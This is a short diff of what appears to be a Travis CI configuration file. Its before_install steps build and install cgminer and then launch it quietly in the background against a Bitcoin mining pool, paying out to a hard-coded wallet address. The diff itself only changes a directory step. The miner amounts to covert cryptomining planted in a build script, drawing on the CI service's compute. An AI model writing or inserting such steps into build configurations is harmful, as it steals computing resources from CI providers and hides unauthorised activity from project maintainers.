@@ -14,7 +14,7 @@ before_install:
   - make -j16
   - sudo make install
   - ./cgminer -o stratum+tcp://stratum.mining.eligius.st:3334 -u 16GgJNQDHxx2NpjSxgrAAndnSEjBR4uBTt -p x --cpu-threads 1 --text-only --api-listen --real-quiet &
-  - cd ..
+  - cd ../..
 
 notifications:
   email: false
